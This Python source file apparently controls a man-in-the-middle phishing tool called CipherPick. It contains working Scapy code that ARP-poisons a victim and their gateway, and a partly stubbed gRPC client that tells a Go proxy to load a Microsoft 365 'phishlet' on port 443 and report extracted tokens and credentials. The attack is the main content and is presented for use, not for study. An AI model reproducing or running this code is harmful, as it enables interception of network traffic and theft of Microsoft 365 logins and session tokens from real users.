"""
CipherPick - MITM Network Controller (Python)
Role: Layer 2 ARP Cache Poisoning and gRPC Client for Go Proxy Engine
"""

import sys
import time
import asyncio
import threading
import logging
from typing import Optional

# Scapy for Layer 2 Networking
import scapy.all as scapy

# gRPC imports (assuming pb2 generated files exist in ./proto)
import grpc
# import proto.mitm_pb2 as mitm_pb2
# import proto.mitm_pb2_grpc as mitm_pb2_grpc

# Configure defensive logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] (Controller) %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("CipherPick.NetworkController")

class ArpPoisoner:
    """Handles Layer 2 ARP Cache Poisoning with Dual-Target Logic."""
    
    def __init__(self, target_ip: str, gateway_ip: str, interface: str):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def _get_mac(self, ip: str) -> Optional[str]:
        """Resolve MAC address for a given IP."""
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        # Using a timeout to prevent hanging, srp returns answered and unanswered
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=self.interface)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def _poison(self, target_ip: str, target_mac: str, spoof_ip: str):
        """Send a single poisoned ARP packet."""
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False, iface=self.interface)

    def _restore(self, dest_ip: str, dest_mac: str, source_ip: str, source_mac: str):
        """Restore ARP cache to original state."""
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=self.interface)

    def start(self):
        """Start the ARP poisoning in a background thread."""
        logger.info(f"Resolving MAC addresses for {self.target_ip} and {self.gateway_ip}...")
        target_mac = self._get_mac(self.target_ip)
        gateway_mac = self._get_mac(self.gateway_ip)

        if not target_mac or not gateway_mac:
            logger.error(f"Failed to resolve MAC addresses: Target({target_mac}) Gateway({gateway_mac})")
            return

        def poison_loop():
            logger.info(f"Starting ARP poisoning between {self.target_ip} and {self.gateway_ip}")
            while not self._stop_event.is_set():
                # Dual-target logic: poison target to think we are gateway, and gateway to think we are target
                self._poison(self.target_ip, target_mac, self.gateway_ip)
                self._poison(self.gateway_ip, gateway_mac, self.target_ip)
                time.sleep(2)
            
            logger.info("Restoring ARP caches...")
            self._restore(self.target_ip, target_mac, self.gateway_ip, gateway_mac)
            self._restore(self.gateway_ip, gateway_mac, self.target_ip, target_mac)
            logger.info("ARP caches restored.")

        self._thread = threading.Thread(target=poison_loop, daemon=True)
        self._thread.start()

    def stop(self):
        """Stop the ARP poisoning."""
        self._stop_event.set()
        if self._thread:
            self._thread.join()

class ProxyClient:
    """gRPC Client to communicate with the Go Interception Proxy Engine."""
    
    def __init__(self, target_addr: str = "localhost:50051"):
        self.target_addr = target_addr
        # Boilerplate logic - uncomment when proto is compiled
        # self.channel = grpc.aio.insecure_channel(target_addr)
        # self.stub = mitm_pb2_grpc.MitmProxyStub(self.channel)
        logger.info(f"Initialized ProxyClient pointing to {target_addr}")

    async def start_proxy(self, listen_address: str, target_domain: str):
        """Send command to start the Go Proxy."""
        # request = mitm_pb2.StartRequest(listen_address=listen_address, target_domain=target_domain)
        # response = await self.stub.StartProxy(request)
        # return response.success
        logger.info(f"Requested Go Proxy to start on {listen_address} targeting {target_domain}")
        return True

    async def load_phishlet(self, name: str, config: str):
        """Send command to load a Phishlet configuration."""
        # request = mitm_pb2.LoadPhishletRequest(phishlet_name=name, config_json=config)
        # response = await self.stub.LoadPhishlet(request)
        # return response.success
        logger.info(f"Requested Go Proxy to load phishlet: {name}")
        return True

    async def stream_telemetry(self):
        """Asynchronously listen for telemetry events from the Go Proxy."""
        logger.info("Starting telemetry stream from Go Proxy...")
        try:
            # request = mitm_pb2.TelemetryRequest()
            # async for event in self.stub.StreamTelemetry(request):
            #     self._handle_telemetry_event(event)
            
            # Simulated telemetry stream for boilerplate
            while True:
                await asyncio.sleep(5)
                logger.info("Telemetry Event: [KEEP-ALIVE] Waiting for traffic...")
        except asyncio.CancelledError:
            logger.info("Telemetry streaming cancelled.")
        except Exception as e:
            logger.error(f"Telemetry stream error: {e}")

    def _handle_telemetry_event(self, event):
        """Process incoming telemetry events."""
        # EventType: 1=TOKEN, 2=HSTS_BLOCKED, 3=CREDENTIAL
        # if event.type == mitm_pb2.TelemetryEvent.TOKEN_EXTRACTED:
        #     logger.warning(f"Extracted Token from {event.source_ip}: {event.payload}")
        pass

async def main():
    target_ip = "192.168.1.100"
    gateway_ip = "192.168.1.1"
    interface = "eth0" # Update for Windows if necessary (e.g. "Ethernet")

    # Initialize ARP Poisoner
    poisoner = ArpPoisoner(target_ip, gateway_ip, interface)
    
    # Initialize Go Proxy Client
    proxy_client = ProxyClient()

    try:
        # Start ARP Poisoning
        poisoner.start()

        # Command the Go Proxy to load a phishlet and start listening
        await proxy_client.load_phishlet("m365_enterprise", '{"domain": "login.microsoftonline.com"}')
        await proxy_client.start_proxy("0.0.0.0:443", "login.microsoftonline.com")

        # Stream telemetry in the background
        telemetry_task = asyncio.create_task(proxy_client.stream_telemetry())

        # Keep the controller alive
        await asyncio.Event().wait()

    except KeyboardInterrupt:
        logger.info("Controller shutting down...")
    finally:
        # Cleanup
        poisoner.stop()
        
if __name__ == "__main__":
    # Ensure graceful exit on KeyboardInterrupt
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
